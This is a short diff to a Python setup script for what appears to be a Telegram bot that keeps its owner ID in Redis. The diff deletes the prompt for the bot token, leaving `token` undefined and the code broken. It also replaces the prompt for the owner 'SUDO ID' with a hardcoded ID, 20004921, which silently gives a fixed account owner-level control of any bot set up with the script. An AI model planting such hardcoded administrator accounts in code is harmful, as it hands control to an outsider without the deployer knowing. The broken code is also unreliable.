@@ -18,10 +18,9 @@ try:
   r.set(f'{Dev_Zaid}botowner', owner_id)
 except Exception as e:
   with open ('information.py','w+') as www:
-     token = input ('[+] Enter the bot token : ')
      Dev_Zaid = token.split(':')[0]
      if not r.get(f'{Dev_Zaid}botowner'):
-       owner_id = int(input('[+] Enter SUDO ID : '))
+       owner_id = 20004921
        r.set(f'{Dev_Zaid}botowner', owner_id)
      else:
         owner_id = int(r.get(f'{Dev_Zaid}botowner'))
